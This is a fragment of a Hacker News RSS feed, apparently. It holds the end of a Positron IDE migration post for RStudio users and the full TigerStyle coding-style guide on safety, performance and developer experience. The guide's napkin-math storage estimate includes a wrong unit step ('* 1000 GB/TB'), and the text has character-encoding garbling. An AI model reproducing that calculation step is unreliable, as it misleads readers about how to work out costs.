    &lt;p&gt;We anticipate many RStudio users will be curious about Positron. When building Positron, we strived to create a familiar interface while adding extensibility and new features, as well as native support for multiple languages. Positron is designed for data scientists and analysts who work with both R and Python and want a flexible, modern, and powerful IDE.&lt;/p&gt;
    &lt;p&gt;Key features for RStudio users include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Native multi-language support: Positron is a polyglot IDE, designed from the ground up to support both R and Python seamlessly.&lt;/item&gt;
      &lt;item&gt;Familiar interface: We designed Positron with a layout similar to RStudio, so you‚Äôll feel right at home with the editor, console, and file panes. We also offer an option to use your familiar RStudio keyboard shortcuts.&lt;/item&gt;
      &lt;item&gt;Extensibility: Because Positron is built on Code OSS, you can use thousands of extensions from the Open VSX marketplace to customize your IDE and workflow.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See the RStudio migration guide here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Migration walkthroughs in Positron&lt;/head&gt;
    &lt;p&gt;Also, check out our migration walkthroughs in Positron itself; find them by searching ‚ÄúWelcome: Open Walkthrough‚Äù in the Command Palette (hit the shortcut Cmd + Shift + P to open the Command Palette), or on the Welcome page when you open Positron:&lt;/p&gt;
    &lt;head rend="h2"&gt;What‚Äôs next&lt;/head&gt;
    &lt;p&gt;We‚Äôre committed to making your transition as smooth as possible, and we‚Äôll be continuing to add to these migration guides. Look out for guides for Jupyter users and more!&lt;/p&gt;
    &lt;p&gt;We‚Äôd love to hear from you. What other guides would you like to see? What features would make your transition easier? Join the conversation in our GitHub Discussions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46075462</guid><pubDate>Fri, 28 Nov 2025 04:15:34 +0000</pubDate></item><item><title>TigerStyle: Coding philosophy focused on safety, performance, dev experience</title><link>https://tigerstyle.dev/</link><description>&lt;doc fingerprint="659e4bba43116a0"&gt;
  &lt;main&gt;
    &lt;p&gt;Version 0.1-dev&lt;/p&gt;
    &lt;p&gt;Tiger Style is a coding philosophy focused on safety, performance, and developer experience. Inspired by the practices of TigerBeetle, it focuses on building robust, efficient, and maintainable software through disciplined engineering.&lt;/p&gt;
    &lt;p&gt;Additional sections: Addendum, Colophon&lt;/p&gt;
    &lt;p&gt;Tiger Style is not just a set of coding standards; it's a practical approach to software development. By prioritizing safety, performance, and developer experience, you create code that is reliable, efficient, and enjoyable to work with.&lt;/p&gt;
    &lt;p&gt;Safety is the foundation of Tiger Style. It means writing code that works in all situations and reduces the risk of errors. Focusing on safety makes your software reliable and trustworthy.&lt;/p&gt;
    &lt;p&gt;Performance is about using resources efficiently to deliver fast, responsive software. Prioritizing performance early helps you design systems that meet or exceed user expectations.&lt;/p&gt;
    &lt;p&gt;A good developer experience improves code quality and maintainability. Readable and easy-to-work-with code encourages collaboration and reduces errors, leading to a healthier codebase that stands the test of time [1].&lt;/p&gt;
    &lt;p&gt;The design goals focus on building software that is safe, fast, and easy to maintain.&lt;/p&gt;
    &lt;p&gt;Safety in coding relies on clear, structured practices that prevent errors and strengthen the codebase. It's about writing code that works in all situations and catches problems early. By focusing on safety, you create reliable software that behaves predictably no matter where it runs.&lt;/p&gt;
    &lt;p&gt;Predictable control flow and bounded system resources are essential for safe execution.&lt;/p&gt;
    &lt;p&gt;Simple and explicit control flow: Favor straightforward control structures over complex logic. Simple control flow makes code easier to understand and reduces the risk of bugs. Avoid recursion if possible to keep execution bounded and predictable, preventing stack overflows and uncontrolled resource use.&lt;/p&gt;
    &lt;p&gt;Set fixed limits: Set explicit upper bounds on loops, queues, and other data structures. Fixed limits prevent infinite loops and uncontrolled resource use, following the fail-fast principle. This approach helps catch issues early and keeps the system stable.&lt;/p&gt;
    &lt;p&gt;Limit function length: Keep functions concise, ideally under 70 lines. Shorter functions are easier to understand, test, and debug. They promote single responsibility, where each function does one thing well, leading to a more modular and maintainable codebase.&lt;/p&gt;
    &lt;p&gt;Centralize control flow: Keep switch or if statements in the main parent function, and move non-branching logic to helper functions. Let the parent function manage state, using helpers to calculate changes without directly applying them. Keep leaf functions pure and focused on specific computations. This divides responsibility: one function controls flow, others handle specific logic.&lt;/p&gt;
    &lt;p&gt;Clear and consistent handling of memory and types is key to writing safe, portable code.&lt;/p&gt;
    &lt;p&gt; Use explicitly sized types: Use data types with explicit sizes, like &lt;code&gt;u32&lt;/code&gt; or &lt;code&gt;i64&lt;/code&gt;, instead
					of architecture-dependent types like &lt;code&gt;usize&lt;/code&gt;. This keeps
					behavior consistent across platforms and avoids size-related errors,
					improving portability and reliability.
				&lt;/p&gt;
    &lt;p&gt;Static memory allocation: Allocate all necessary memory during startup and avoid dynamic memory allocation after initialization. Dynamic allocation at runtime can cause unpredictable behavior, fragmentation, and memory leaks. Static allocation makes memory management simpler and more predictable.&lt;/p&gt;
    &lt;p&gt;Minimize variable scope: Declare variables in the smallest possible scope. Limiting scope reduces the risk of unintended interactions and misuse. It also makes the code more readable and easier to maintain by keeping variables within their relevant context.&lt;/p&gt;
    &lt;p&gt;Correct error handling keeps the system robust and reliable in all conditions.&lt;/p&gt;
    &lt;p&gt;Use assertions: Use assertions to verify that conditions hold true at specific points in the code. Assertions work as internal checks, increase robustness, and simplify debugging.&lt;/p&gt;
    &lt;p&gt;Handle all errors: Check and handle every error. Ignoring errors can lead to undefined behavior, security issues, or crashes. Write thorough tests for error-handling code to make sure your application works correctly in all cases.&lt;/p&gt;
    &lt;p&gt;Treat compiler warnings as errors: Use the strictest compiler settings and treat all warnings as errors. Warnings often point to potential issues that could cause bugs. Fixing them right away improves code quality and reliability.&lt;/p&gt;
    &lt;p&gt;Avoid implicit defaults: Explicitly specify options when calling library functions instead of relying on defaults. Implicit defaults can change between library versions or across environments, causing inconsistent behavior. Being explicit improves code clarity and stability.&lt;/p&gt;
    &lt;p&gt;Performance is about using resources efficiently to deliver fast, responsive software. Prioritizing performance early helps design systems that meet or exceed user expectations without unnecessary overhead.&lt;/p&gt;
    &lt;p&gt;Early design decisions have a significant impact on performance. Thoughtful planning helps avoid bottlenecks later.&lt;/p&gt;
    &lt;p&gt;Design for performance early: Consider performance during the initial design phase. Early architectural decisions have a big impact on overall performance, and planning ahead ensures you can avoid bottlenecks and improve resource efficiency.&lt;/p&gt;
    &lt;p&gt;Napkin math: Use quick, back-of-the-envelope calculations to estimate system performance and resource costs. For example, estimate how long it takes to read 1 GB of data from memory or what the expected storage cost will be for logging 100,000 requests per second. This helps set practical expectations early and identify potential bottlenecks before they occur.&lt;/p&gt;
    &lt;p&gt;Batch operations: Amortize expensive operations by processing multiple items together. Batching reduces overhead per item, increases throughput, and is especially useful for I/O-bound operations.&lt;/p&gt;
    &lt;p&gt;Focus on optimizing the slowest resources, typically in this order:&lt;/p&gt;
    &lt;p&gt;Writing predictable code improves performance by reducing CPU cache misses and optimizing branch prediction.&lt;/p&gt;
    &lt;p&gt;Ensure predictability: Write code with predictable execution paths. Predictable code uses CPU caching and branch prediction better, leading to improved performance. Avoid patterns that cause frequent cache misses or unpredictable branching, as they degrade performance.&lt;/p&gt;
    &lt;p&gt;Reduce compiler dependence: Don't rely solely on compiler optimizations for performance. Write clear, efficient code that doesn't depend on compiler behavior. Be explicit in performance-critical sections to ensure consistent results across compilers.&lt;/p&gt;
    &lt;p&gt;Improving the developer experience creates a more maintainable and collaborative codebase.&lt;/p&gt;
    &lt;p&gt;Get the nouns and verbs right. Great names capture what something is or does and create a clear, intuitive model. They show you understand the domain. Take time to find good names, where nouns and verbs fit together, making the whole greater than the sum of its parts.&lt;/p&gt;
    &lt;p&gt; Clear and consistent naming: Use descriptive and meaningful names for variables, functions, and files. Good naming improves code readability and helps others understand each component's purpose. Stick to a consistent style, like &lt;code&gt;snake_case&lt;/code&gt;, throughout the codebase.
				&lt;/p&gt;
    &lt;p&gt; Avoid abbreviations: Use full words in names unless the abbreviation is widely accepted and clear (e.g., &lt;code&gt;ID&lt;/code&gt;, &lt;code&gt;URL&lt;/code&gt;). Abbreviations can be confusing
					and make it harder for others, especially new contributors, to
					understand the code.
				&lt;/p&gt;
    &lt;p&gt; Include units or qualifiers in names: Append units or qualifiers to variable names, placing them in descending order of significance (e.g., &lt;code&gt;latency_ms_max&lt;/code&gt; instead of
					&lt;code&gt;max_latency_ms&lt;/code&gt;). This clears up meaning, avoids
					confusion, and ensures related variables, like
					&lt;code&gt;latency_ms_min&lt;/code&gt;, line up logically and group together.
				&lt;/p&gt;
    &lt;p&gt;Document the 'why': Use comments to explain why decisions were made, not just what the code does. Knowing the intent helps others maintain and extend the code properly. Give context for complex algorithms, unusual approaches, or key constraints.&lt;/p&gt;
    &lt;p&gt;Use proper comment style: Write comments as complete sentences with correct punctuation and grammar. Clear, professional comments improve readability and show attention to detail. They help create a cleaner, more maintainable codebase.&lt;/p&gt;
    &lt;p&gt;Organizing code well makes it easy to navigate, maintain, and extend. A logical structure reduces cognitive load, letting developers focus on solving problems instead of figuring out the code. Group related elements, and simplify interfaces to keep the codebase clean, scalable, and manageable as complexity grows.&lt;/p&gt;
    &lt;p&gt;Organize code logically: Structure your code logically. Group related functions and classes together. Order code naturally, placing high-level abstractions before low-level details. Logical organization makes code easier to navigate and understand.&lt;/p&gt;
    &lt;p&gt;Simplify function signatures: Keep function interfaces simple. Limit parameters, and prefer returning simple types. Simple interfaces reduce cognitive load, making functions easier to understand and use correctly.&lt;/p&gt;
    &lt;p&gt;Construct objects in-place: Initialize large structures or objects directly where they are declared. In-place construction avoids unnecessary copying or moving of data, improving performance and reducing the potential for lifecycle errors.&lt;/p&gt;
    &lt;p&gt;Minimize variable scope: Declare variables close to their usage and within the smallest necessary scope. This reduces the risk of misuse and makes code easier to read and maintain.&lt;/p&gt;
    &lt;p&gt;Maintaining consistency in your code helps reduce errors and creates a stable foundation for the rest of the system.&lt;/p&gt;
    &lt;p&gt;Avoid duplicates and aliases: Prevent inconsistencies by avoiding duplicated variables or unnecessary aliases. When two variables represent the same data, there's a higher chance they fall out of sync. Use references or pointers to maintain a single source of truth.&lt;/p&gt;
    &lt;p&gt;Pass large objects by reference: If a function's argument is larger than 16 bytes, pass it as a reference instead of by value to avoid unnecessary copying. This can catch bugs early where unintended copies may occur.&lt;/p&gt;
    &lt;p&gt; Minimize dimensionality: Keep function signatures and return types simple to reduce the number of cases a developer has to handle. For example, prefer &lt;code&gt;void&lt;/code&gt; over
					&lt;code&gt;bool&lt;/code&gt;, &lt;code&gt;bool&lt;/code&gt; over &lt;code&gt;u64&lt;/code&gt;, and so
					on, when it suits the function's purpose.
				&lt;/p&gt;
    &lt;p&gt;Handle buffer allocation cleanly: When working with buffers, allocate them close to where they are used and ensure all corresponding cleanup happens in the same logical block. Group resource allocation and deallocation with clear newlines to make leaks easier to identify.&lt;/p&gt;
    &lt;p&gt; Off-by-one errors often result from casual interactions between an &lt;code&gt;index&lt;/code&gt;, a &lt;code&gt;count&lt;/code&gt;, or a &lt;code&gt;size&lt;/code&gt;. Treat
			these as distinct types, and apply clear rules when converting between
			them.
		&lt;/p&gt;
    &lt;p&gt;Indexes, counts, and sizes: Indexes are 0-based, counts are 1-based, and sizes represent total memory usage. When converting between them, add or multiply accordingly. Use meaningful names with units or qualifiers to avoid confusion. See&lt;/p&gt;
    &lt;p&gt;Handle division intentionally: When dividing, make your intent clear by specifying how rounding should be handled in edge cases. Use functions or operators designed for exact division, floor division, or ceiling division. This avoids ambiguity and ensures the result behaves as expected.&lt;/p&gt;
    &lt;p&gt;Consistency in code style and tools improves readability, reduces mental load, and makes working together easier.&lt;/p&gt;
    &lt;p&gt;Maintain consistent indentation: Use a uniform indentation style across the codebase. For example, using 4 spaces for indentation provides better visual clarity, especially in complex structures.&lt;/p&gt;
    &lt;p&gt;Limit line lengths: Keep lines within a reasonable length (e.g., 100 characters) to ensure readability. This prevents horizontal scrolling and helps maintain an accessible code layout.&lt;/p&gt;
    &lt;p&gt;Use clear code blocks: Structure code clearly by separating blocks (e.g., control structures, loops, function definitions) to make it easy to follow. Avoid placing multiple statements on a single line, even if allowed. Consistent block structures prevent subtle logic errors and make code easier to maintain.&lt;/p&gt;
    &lt;p&gt;Minimize external dependencies: Reducing external dependencies simplifies the build process and improves security management. Fewer dependencies lower the risk of supply chain attacks, minimize performance issues, and speed up installation.&lt;/p&gt;
    &lt;p&gt;Standardize tooling: Using a small, standardized set of tools simplifies the development environment and reduces accidental complexity. Choose cross-platform tools where possible to avoid platform-specific issues and improve portability across systems.&lt;/p&gt;
    &lt;p&gt;While Tiger Style focuses on the core principles of safety, performance, and developer experience, these are reinforced by an underlying commitment to zero technical debt.&lt;/p&gt;
    &lt;p&gt;A zero technical debt policy is key to maintaining a healthy codebase and ensuring long-term productivity. Addressing potential issues proactively and building robust solutions from the start helps avoid debt that would slow future development.&lt;/p&gt;
    &lt;p&gt;Do it right the first time: Take the time to design and implement solutions correctly from the start. Rushed features lead to technical debt that requires costly refactoring later.&lt;/p&gt;
    &lt;p&gt;Be proactive in problem-solving: Anticipate potential issues and fix them before they escalate. Early detection saves time and resources, preventing performance bottlenecks and architectural flaws.&lt;/p&gt;
    &lt;p&gt;Build momentum: Delivering solid, reliable code builds confidence and enables faster development cycles. High-quality work supports innovation and reduces the need for future rewrites.&lt;/p&gt;
    &lt;p&gt;Avoiding technical debt ensures that progress is true progress‚Äîsolid, reliable, and built to last.&lt;/p&gt;
    &lt;p&gt;You should think about performance early in design. Napkin math is a helpful tool for this.&lt;/p&gt;
    &lt;p&gt;Napkin math uses simple calculations and rounded numbers to quickly estimate system performance and resource needs.&lt;/p&gt;
    &lt;p&gt;For example, if you're designing a system to store logs, you can estimate storage costs like this:&lt;/p&gt;
    &lt;code&gt;
				 
1. Estimate log volume:
   Assume 1,000 requests per second (RPS)
   Each log entry is about 1 KB

2. Calculate daily log volume:
   1,000 RPS * 86,400 seconds/day * 1 KB ‚âà 86,400,000 KB/day ‚âà 86.4 GB/day

3. Estimate monthly storage:
   86.4 GB/day * 30 days ‚âà 2,592 GB/month

4. Estimate cost (using $0.02 per GB for blob storage):
   2,592 GB * 1000 GB/TB * $0.02/GB ‚âà $51 per month
			&lt;/code&gt;
    &lt;p&gt;This gives you a rough idea of monthly storage costs. It helps you check if your logging plan works. The idea is to get within 10x of the right answer.&lt;/p&gt;
    &lt;p&gt;For more, see Simon Eskildsen's napkin math project.&lt;/p&gt;
    &lt;p&gt;This document is a "remix" inspired by the original Tiger Style guide from the TigerBeetle project. In the spirit of Remix Culture, parts of this document are verbatim copies of the original work, while other sections have been rewritten or adapted to fit the goals of this version. This remix builds upon the principles outlined in the original document with a more general approach.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46075628</guid><pubDate>Fri, 28 Nov 2025 04:53:07 +0000</pubDate></item></channel></rss>